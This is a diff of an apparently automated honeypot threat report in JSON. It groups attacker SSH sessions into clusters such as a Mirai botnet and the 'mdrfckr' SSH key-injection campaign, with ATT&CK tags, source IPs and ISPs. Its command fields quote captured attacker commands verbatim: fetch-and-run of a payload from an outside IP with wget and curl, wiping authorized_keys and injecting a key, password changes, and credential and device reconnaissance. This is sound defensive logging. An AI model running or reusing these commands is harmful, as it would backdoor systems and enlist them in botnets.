@@ -1,33 +1,30 @@
 {
-  "generated_at": "2026-08-25T18:43:23.961896+00:00",
-  "total_sessions_with_commands": 6,
+  "generated_at": "2026-08-25T20:32:42.953502+00:00",
+  "total_sessions_with_commands": 10,
   "total_clusters": 5,
   "campaign_clusters": 2,
   "singleton_clusters": 4,
   "highest_severity": "HIGH",
   "active_campaigns": [
     {
-      "cluster_id": "CLU-002",
-      "name": "mdrfckr SSH Key Injection",
+      "cluster_id": "CLU-001",
+      "name": "Mirai/IoT Botnet",
       "severity": "HIGH",
       "session_count": 1,
       "unique_ip_count": 1,
       "ttps": [
-        "T1021.004",
-        "T1078",
-        "T1082",
-        "T1592",
+        "T1105",
         "T1070",
         "T1140",
-        "T1105"
+        "T1059.004"
       ]
     },
     {
-      "cluster_id": "CLU-003",
+      "cluster_id": "CLU-004",
       "name": "mdrfckr SSH Key Injection",
       "severity": "HIGH",
-      "session_count": 2,
-      "unique_ip_count": 2,
+      "session_count": 6,
+      "unique_ip_count": 6,
       "ttps": [
         "T1021.004",
         "T1078",
@@ -40,85 +37,33 @@
   "clusters": [
     {
       "cluster_id": "CLU-001",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "165.1.75.106"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "d2af147dd3fa2817",
-      "ttps": [
-        {
-          "id": "T1105",
-          "name": "Ingress Tool Transfer"
-        }
-      ],
-      "representative_commands": [
-        "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
-        "apt-get update -y",
-        "apt-get install -y python3",
-        "python3 /tmp/bendi.py",
-        "rm /tmp/bendi.py",
-        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
-        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sexy.pp.ua --auto-discovery DsR94pYWmSUpC3n43RmwPxKw"
-      ],
-      "members": [
-        {
-          "session_id": "IR-d23678d709cf",
-          "src_ip": "165.1.75.106",
-          "country": "US",
-          "isp": "Oracle Corporation",
-          "command_count": 7,
-          "timestamp": "2026-08-25T16:29:11.456929Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-002",
       "is_campaign": true,
-      "campaign_name": "mdrfckr SSH Key Injection",
+      "campaign_name": "Mirai/IoT Botnet",
       "campaign_severity": "HIGH",
-      "campaign_description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
+      "campaign_description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
       "matched_campaigns": [
         {
-          "name": "mdrfckr SSH Key Injection",
+          "name": "Mirai/IoT Botnet",
           "ttps": [
-            "T1021.004",
-            "T1078",
-            "T1105"
+            "T1105",
+            "T1059.004"
           ],
           "severity": "HIGH",
-          "description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
-          "pattern_hits": 3,
+          "description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
+          "pattern_hits": 1,
           "pattern_total": 3
         }
       ],
       "session_count": 1,
       "unique_ips": [
-        "58.221.60.25"
+        "45.198.224.26"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "26f780e5f2a4baf5",
+      "sequence_hash": "18bc48b47c351ba6",
       "ttps": [
         {
-          "id": "T1021.004",
-          "name": "Remote Services: SSH"
-        },
-        {
-          "id": "T1078",
-          "name": "Valid Accounts"
-        },
-        {
-          "id": "T1082",
-          "name": "System Information Discovery"
-        },
-        {
-          "id": "T1592",
-          "name": "Gather Victim Host Info"
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
         },
         {
           "id": "T1070",
@@ -129,31 +74,142 @@
           "name": "Deobfuscate/Decode Files"
         },
         {
-          "id": "T1105",
-          "name": "T1105"
+          "id": "T1059.004",
+          "name": "T1059.004"
         }
       ],
       "representative_commands": [
-        "cd ~; chattr -ia .ssh; lockr -ia .ssh",
-        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-        "cat /proc/cpuinfo | grep name | wc -l",
-        "echo -e \"1234\\n3v7K9AYZd6Lv\\n3v7K9AYZd6Lv\"|passwd|bash",
-        "Enter new UNIX password:",
-        "echo \"1234\\n3v7K9AYZd6Lv\\n3v7K9AYZd6Lv\\n\"|passwd"
+        "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &",
+        "cd /tmp",
+        "wget http://5.182.210.174/ok",
+        "curl -O http://5.182.210.174/ok",
+        "chmod +x ok",
+        "sh ok",
+        "rm -rf ok",
+        "rm -rf ok.1",
+        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/bin/wget http://5.182.210.174/ok;curl -O http://5.182.210.174/ok;busybox curl -O http://5.182.210.174/ok;chmod 777 ok;./ok;sh ok;busybox sh ok;rm -rf ok ok.1) >/dev/null 2>&1 &",
+        "cd /tmp"
       ],
       "members": [
         {
-          "session_id": "IR-727b12074290",
-          "src_ip": "58.221.60.25",
-          "country": "CN",
-          "isp": "CHINANET jiangsu province network",
-          "command_count": 6,
-          "timestamp": "2026-08-25T15:21:29.068979Z"
+          "session_id": "IR-75b30f5b49bc",
+          "src_ip": "45.198.224.26",
+          "country": "NL",
+          "isp": "VPSVAULT.HOST LTD",
+          "command_count": 24,
+          "timestamp": "2026-08-25T18:32:13.763034Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-002",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "8.211.183.26"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "4c607d78896f7ae1",
+      "ttps": [
+        {
+          "id": "T1078",
+          "name": "Valid Accounts"
+        },
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        },
+        {
+          "id": "T1070",
+          "name": "Indicator Removal"
+        },
+        {
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files"
+        },
+        {
+          "id": "T1003",
+          "name": "Credential Dumping"
+        }
+      ],
+      "representative_commands": [
+        "id",
+        "cat /etc/passwd",
+        "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
+        "enable",
+        "system",
+        "shell",
+        "sh",
+        "bash",
+        "cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----",
+        "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW"
+      ],
+      "members": [
+        {
+          "session_id": "IR-a11f1e85e43f",
+          "src_ip": "8.211.183.26",
+          "country": "JP",
+          "isp": "Alibaba Cloud (Singapore) Private Limited",
+          "command_count": 16,
+          "timestamp": "2026-08-25T18:51:57.839195Z"
         }
       ]
     },
     {
       "cluster_id": "CLU-003",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "125.140.145.62"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "c74cbeb6eac6dc54",
+      "ttps": [
+        {
+          "id": "T1083",
+          "name": "File & Directory Discovery"
+        },
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        },
+        {
+          "id": "T1592",
+          "name": "Gather Victim Host Info"
+        }
+      ],
+      "representative_commands": [
+        "/ip cloud print",
+        "ifconfig",
+        "uname -a",
+        "cat /proc/cpuinfo",
+        "ps | grep '[Mm]iner'",
+        "ps -ef | grep '[Mm]iner'",
+        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*",
+        "locate D877F783D5D3EF8Cs",
+        "echo Hi | cat -n"
+      ],
+      "members": [
+        {
+          "session_id": "IR-a097737a3f2e",
+          "src_ip": "125.140.145.62",
+          "country": "KR",
+          "isp": "Korea Telecom",
+          "command_count": 9,
+          "timestamp": "2026-08-25T18:16:37.506395Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-004",
       "is_campaign": true,
       "campaign_name": "mdrfckr SSH Key Injection",
       "campaign_severity": "HIGH",
@@ -172,12 +228,16 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 2,
+      "session_count": 6,
       "unique_ips": [
-        "194.164.59.59",
-        "103.187.147.0"
+        "118.145.238.115",
+        "103.183.62.1",
+        "72.17.34.38",
+        "103.183.62.3",
+        "5.188.16.97",
+        "210.79.142.201"
       ],
-      "unique_ip_count": 2,
+      "unique_ip_count": 6,
       "sequence_hash": "98af0db988d5971c",
       "ttps": [
         {
@@ -207,48 +267,52 @@
       ],
       "members": [
         {
-          "session_id": "IR-aeba56152280",
-          "src_ip": "194.164.59.59",
-          "country": "DE",
-          "isp": "IONOS SE",
+          "session_id": "IR-e76440e85c5f",
+          "src_ip": "103.183.62.3",
+          "country": "BD",
+          "isp": "MD SHARJAHAN t/a Hasan Broadband Net",
           "command_count": 2,
-          "timestamp": "2026-08-25T15:04:56.356550Z"
+          "timestamp": "2026-08-25T16:57:29.163072Z"
         },
         {
-          "session_id": "IR-375b8e697853",
-          "src_ip": "103.187.147.0",
-          "country": "SG",
-          "isp": "Cloud Host Pte Ltd",
+          "session_id": "IR-52673ae6c45a",
+          "src_ip": "72.17.34.38",
+          "country": "US",
+          "isp": "Charter Communications, Inc",
           "command_count": 2,
-          "timestamp": "2026-08-25T16:51:00.857609Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-004",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "207.46.224.87"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "f03826b87738be78",
-      "ttps": [],
-      "representative_commands": [
-        "netstat -tulpn | head -10"
-      ],
-      "members": [
+          "timestamp": "2026-08-25T17:00:09.944006Z"
+        },
         {
-          "session_id": "IR-b5185a0632af",
-          "src_ip": "207.46.224.87",
-          "country": "SG",
-          "isp": "Microsoft Corporation",
-          "command_count": 1,
-          "timestamp": "2026-08-25T16:17:53.642457Z"
+          "session_id": "IR-df4948e5171e",
+          "src_ip": "5.188.16.97",
+          "country": "EE",
+          "isp": "Network for hosting services",
+          "command_count": 2,
+          "timestamp": "2026-08-25T17:00:56.415611Z"
+        },
+        {
+          "session_id": "IR-c5f6970da63f",
+          "src_ip": "118.145.238.115",
+          "country": "CN",
+          "isp": "Beijing Volcano Engine Technology Co., Ltd.",
+          "command_count": 2,
+          "timestamp": "2026-08-25T17:14:57.715902Z"
+        },
+        {
+          "session_id": "IR-bdcadd6f5298",
+          "src_ip": "210.79.142.201",
+          "country": "ID",
+          "isp": "PT Cakrawala Link Nusantara",
+          "command_count": 2,
+          "timestamp": "2026-08-25T17:17:16.347764Z"
+        },
+        {
+          "session_id": "IR-4f20460c0d53",
+          "src_ip": "103.183.62.1",
+          "country": "BD",
+          "isp": "MD SHARJAHAN t/a Hasan Broadband Net",
+          "command_count": 2,
+          "timestamp": "2026-08-25T18:37:14.326222Z"
         }
       ]
     },
@@ -276,12 +340,12 @@
       ],
       "members": [
         {
-          "session_id": "IR-01fffb3ab6ef",
+          "session_id": "IR-a1f341fc8cf9",
           "src_ip": "130.12.180.51",
           "country": "DE",
           "isp": "Virtualine Technologies",
           "command_count": 1,
-          "timestamp": "2026-08-25T16:41:07.827161Z"
+          "timestamp": "2026-08-25T17:02:20.969267Z"
         }
       ]
     }
